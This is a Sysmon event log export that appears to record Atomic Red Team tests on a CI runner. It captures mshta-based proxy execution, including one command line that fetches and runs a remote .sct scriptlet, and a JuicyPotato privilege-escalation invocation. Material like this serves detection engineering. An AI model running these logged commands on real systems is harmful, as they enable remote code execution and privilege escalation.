"12/17/2025 8:04:06 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:06.543
ProcessGuid: {f995aebf-63f6-6942-8006-000000000e00}
ProcessId: 7564
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -noexit -file C:\AtomicRedTeam\atomics\T1218.005\src\powershell.ps1
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-63f6-6942-7f06-000000000e00}
ParentProcessId: 8032
ParentImage: C:\Windows\System32\mshta.exe
ParentCommandLine: mshta  vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"powershell -noexit -file C:\AtomicRedTeam\atomics\T1218.005\src\powershell.ps1"""":close"")
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:06 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:06.429
ProcessGuid: {f995aebf-63f6-6942-7f06-000000000e00}
ProcessId: 8032
Image: C:\Windows\System32\mshta.exe
FileVersion: 11.00.26100.2454 (WinBuild.160101.0800)
Description: Microsoft (R) HTML Application host
Product: Internet Explorer
Company: Microsoft Corporation
OriginalFileName: MSHTA.EXE
CommandLine: mshta  vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"powershell -noexit -file C:\AtomicRedTeam\atomics\T1218.005\src\powershell.ps1"""":close"")
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=1F1AABE87E5E93A8FFF769BF3614DD559C51C80FC045E11868F3843D9A004D1E
ParentProcessGuid: {f995aebf-63f6-6942-7d06-000000000e00}
ParentProcessId: 5992
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c mshta vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"powershell -noexit -file C:\AtomicRedTeam\atomics\T1218.005\src\powershell.ps1"""":close"")
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:06 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:06.398
ProcessGuid: {f995aebf-63f6-6942-7d06-000000000e00}
ProcessId: 5992
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c mshta vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"powershell -noexit -file C:\AtomicRedTeam\atomics\T1218.005\src\powershell.ps1"""":close"")
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:05 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:05.810
ProcessGuid: {f995aebf-63f5-6942-7a06-000000000e00}
ProcessId: 3036
Image: C:\Windows\System32\mshta.exe
FileVersion: 11.00.26100.2454 (WinBuild.160101.0800)
Description: Microsoft (R) HTML Application host
Product: Internet Explorer
Company: Microsoft Corporation
OriginalFileName: MSHTA.EXE
CommandLine: mshta.exe  javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct')).Exec();close();
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=1F1AABE87E5E93A8FFF769BF3614DD559C51C80FC045E11868F3843D9A004D1E
ParentProcessGuid: {f995aebf-63f5-6942-7806-000000000e00}
ParentProcessId: 5732
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct')).Exec();close();
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:05 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:05.785
ProcessGuid: {f995aebf-63f5-6942-7806-000000000e00}
ProcessId: 5732
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct')).Exec();close();
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:05 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:05.582
ProcessGuid: {f995aebf-63f5-6942-7706-000000000e00}
ProcessId: 5660
Image: C:\Windows\System32\whoami.exe
FileVersion: 10.0.26100.1882 (WinBuild.160101.0800)
Description: whoami - displays logged on user information
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: whoami.exe
CommandLine: ""C:\Windows\system32\whoami.exe""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:03 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:04:03.076
SourceProcessGUID: {f995aebf-638f-6942-7d05-000000000e00}
SourceProcessId: 8576
SourceThreadId: 4216
SourceImage: C:\Windows\system32\wbem\wmiprvse.exe
TargetProcessGUID: {f995aebf-5ac6-6942-0d00-000000000e00}
TargetProcessId: 996
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1410
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+3fba6|C:\Windows\system32\wbem\cimwin32.dll+11d96|C:\Windows\system32\wbem\cimwin32.dll+115cd|C:\Windows\SYSTEM32\framedynos.dll+d626|C:\Windows\system32\wbem\wmiprvse.exe+8ca9|C:\Windows\system32\wbem\wmiprvse.exe+8338|C:\Windows\System32\RPCRT4.dll+d3663|C:\Windows\System32\RPCRT4.dll+174bd|C:\Windows\System32\combase.dll+9ac7f|C:\Windows\System32\RPCRT4.dll+6cd16|C:\Windows\System32\combase.dll+9ab62|C:\Windows\System32\combase.dll+9a0d6|C:\Windows\System32\combase.dll+99721|C:\Windows\System32\combase.dll+1095d6|C:\Windows\System32\combase.dll+6f51a|C:\Windows\System32\combase.dll+74988|C:\Windows\System32\combase.dll+a40d3|C:\Windows\System32\RPCRT4.dll+880f7|C:\Windows\System32\RPCRT4.dll+51ab4|C:\Windows\System32\RPCRT4.dll+5287a|C:\Windows\System32\RPCRT4.dll+3fc54|C:\Windows\System32\RPCRT4.dll+5001c|C:\Windows\System32\RPCRT4.dll+5601c
SourceUser: NT AUTHORITY\NETWORK SERVICE
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:04:03 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:04:03.003
SourceProcessGUID: {f995aebf-638f-6942-7d05-000000000e00}
SourceProcessId: 8576
SourceThreadId: 4216
SourceImage: C:\Windows\system32\wbem\wmiprvse.exe
TargetProcessGUID: {f995aebf-5ac6-6942-0d00-000000000e00}
TargetProcessId: 996
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1410
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+3fba6|C:\Windows\system32\wbem\cimwin32.dll+11d96|C:\Windows\system32\wbem\cimwin32.dll+115cd|C:\Windows\SYSTEM32\framedynos.dll+d626|C:\Windows\system32\wbem\wmiprvse.exe+8ca9|C:\Windows\system32\wbem\wmiprvse.exe+8338|C:\Windows\System32\RPCRT4.dll+d3663|C:\Windows\System32\RPCRT4.dll+174bd|C:\Windows\System32\combase.dll+9ac7f|C:\Windows\System32\RPCRT4.dll+6cd16|C:\Windows\System32\combase.dll+9ab62|C:\Windows\System32\combase.dll+9a0d6|C:\Windows\System32\combase.dll+99721|C:\Windows\System32\combase.dll+1095d6|C:\Windows\System32\combase.dll+6f51a|C:\Windows\System32\combase.dll+74988|C:\Windows\System32\combase.dll+a40d3|C:\Windows\System32\RPCRT4.dll+880f7|C:\Windows\System32\RPCRT4.dll+51ab4|C:\Windows\System32\RPCRT4.dll+5287a|C:\Windows\System32\RPCRT4.dll+3fc54|C:\Windows\System32\RPCRT4.dll+5001c|C:\Windows\System32\RPCRT4.dll+5601c
SourceUser: NT AUTHORITY\NETWORK SERVICE
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:04:02 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:02.699
ProcessGuid: {f995aebf-63f2-6942-7406-000000000e00}
ProcessId: 3296
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_jvo30pio.xy2.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:02 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:02.676
ProcessGuid: {f995aebf-63f2-6942-7406-000000000e00}
ProcessId: 3296
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_jvo30pio.xy2.ps1
CreationUtcTime: 2025-12-17 08:04:02.676
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:02 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:02.586
ProcessGuid: {f995aebf-63f2-6942-7406-000000000e00}
ProcessId: 3296
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {get-ciminstance Win32_Process | where-object { $_.Path -eq \""""$env:windir\system32\notepad.exe\"""" } | invoke-cimmethod -methodname \""""terminate\"""" | out-null
get-ciminstance Win32_Process | where-object { $_.Path -eq \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\JuicyPotato.exe\"""" } | invoke-cimmethod -methodname \""""terminate\"""" | out-null}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:02 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:04:02.357
SourceProcessGUID: {f995aebf-638f-6942-7d05-000000000e00}
SourceProcessId: 8576
SourceThreadId: 4216
SourceImage: C:\Windows\system32\wbem\wmiprvse.exe
TargetProcessGUID: {f995aebf-5ac6-6942-0d00-000000000e00}
TargetProcessId: 996
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1410
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+3fba6|C:\Windows\system32\wbem\cimwin32.dll+11d96|C:\Windows\system32\wbem\cimwin32.dll+115cd|C:\Windows\SYSTEM32\framedynos.dll+f51a|C:\Windows\SYSTEM32\framedynos.dll+ead5|C:\Windows\system32\wbem\wmiprvse.exe+2b00f|C:\Windows\system32\wbem\wmiprvse.exe+2a25f|C:\Windows\System32\RPCRT4.dll+d3663|C:\Windows\System32\RPCRT4.dll+174bd|C:\Windows\System32\combase.dll+9ac7f|C:\Windows\System32\RPCRT4.dll+6cd16|C:\Windows\System32\combase.dll+9ab62|C:\Windows\System32\combase.dll+9a0d6|C:\Windows\System32\combase.dll+99721|C:\Windows\System32\combase.dll+1095d6|C:\Windows\System32\combase.dll+6f51a|C:\Windows\System32\combase.dll+74988|C:\Windows\System32\combase.dll+a40d3|C:\Windows\System32\RPCRT4.dll+880f7|C:\Windows\System32\RPCRT4.dll+51ab4|C:\Windows\System32\RPCRT4.dll+5287a|C:\Windows\System32\RPCRT4.dll+3fc54|C:\Windows\System32\RPCRT4.dll+5001c
SourceUser: NT AUTHORITY\NETWORK SERVICE
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:04:02 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:02.236
ProcessGuid: {f995aebf-63f2-6942-7106-000000000e00}
ProcessId: 5652
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_eri1k3x3.h4j.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:02 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:02.216
ProcessGuid: {f995aebf-63f2-6942-7106-000000000e00}
ProcessId: 5652
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_eri1k3x3.h4j.ps1
CreationUtcTime: 2025-12-17 08:04:02.216
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:02 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:02.138
ProcessGuid: {f995aebf-63f2-6942-7106-000000000e00}
ProcessId: 5652
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {taskkill /f /im notepad.exe}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:01 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:01.847
ProcessGuid: {f995aebf-63f1-6942-6f06-000000000e00}
ProcessId: 6724
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_5a41cvn4.q5f.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:01 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:01.825
ProcessGuid: {f995aebf-63f1-6942-6f06-000000000e00}
ProcessId: 6724
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_5a41cvn4.q5f.ps1
CreationUtcTime: 2025-12-17 08:04:01.825
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:01 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:01.745
ProcessGuid: {f995aebf-63f1-6942-6f06-000000000e00}
ProcessId: 6724
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:01 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:01.458
ProcessGuid: {f995aebf-63f1-6942-6d06-000000000e00}
ProcessId: 6428
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_vmszlbxo.th3.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:01 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:01.437
ProcessGuid: {f995aebf-63f1-6942-6d06-000000000e00}
ProcessId: 6428
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_vmszlbxo.th3.ps1
CreationUtcTime: 2025-12-17 08:04:01.437
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:01 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:01.356
ProcessGuid: {f995aebf-63f1-6942-6d06-000000000e00}
ProcessId: 6428
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:01 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:01.076
ProcessGuid: {f995aebf-63f0-6942-6b06-000000000e00}
ProcessId: 8124
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ojux5f3v.gpg.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:01 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:01.054
ProcessGuid: {f995aebf-63f0-6942-6b06-000000000e00}
ProcessId: 8124
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ojux5f3v.gpg.ps1
CreationUtcTime: 2025-12-17 08:04:01.054
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:00 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:00.972
ProcessGuid: {f995aebf-63f0-6942-6b06-000000000e00}
ProcessId: 8124
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:00 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:00.814
ProcessGuid: {f995aebf-63f0-6942-6a06-000000000e00}
ProcessId: 4004
Image: C:\Windows\System32\whoami.exe
FileVersion: 10.0.26100.1882 (WinBuild.160101.0800)
Description: whoami - displays logged on user information
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: whoami.exe
CommandLine: ""C:\Windows\system32\whoami.exe""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:55 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:55.335
ProcessGuid: {f995aebf-63eb-6942-6806-000000000e00}
ProcessId: 7060
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""C:\Windows\system32\cmd.exe"" /c C:\AtomicRedTeam\atomics\..\ExternalPayloads\JuicyPotato.exe -l 7777 -t * -p $env:windir\system32\notepad.exe -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
CurrentDirectory: C:\Users\runneradmin\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-63eb-6942-6606-000000000e00}
ParentProcessId: 6844
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""powershell.exe"" & {cmd /c 'C:\AtomicRedTeam\atomics\..\ExternalPayloads\JuicyPotato.exe' -l '7777' -t * -p '$env:windir\system32\notepad.exe' -c '{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}'}
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:55 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:55.251
ProcessGuid: {f995aebf-63eb-6942-6606-000000000e00}
ProcessId: 6844
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_mw2gggje.fc4.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:55 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:55.231
ProcessGuid: {f995aebf-63eb-6942-6606-000000000e00}
ProcessId: 6844
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_mw2gggje.fc4.ps1
CreationUtcTime: 2025-12-17 08:03:55.231
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:55 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:55.151
ProcessGuid: {f995aebf-63eb-6942-6606-000000000e00}
ProcessId: 6844
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {cmd /c 'C:\AtomicRedTeam\atomics\..\ExternalPayloads\JuicyPotato.exe' -l '7777' -t * -p '$env:windir\system32\notepad.exe' -c '{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}'}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
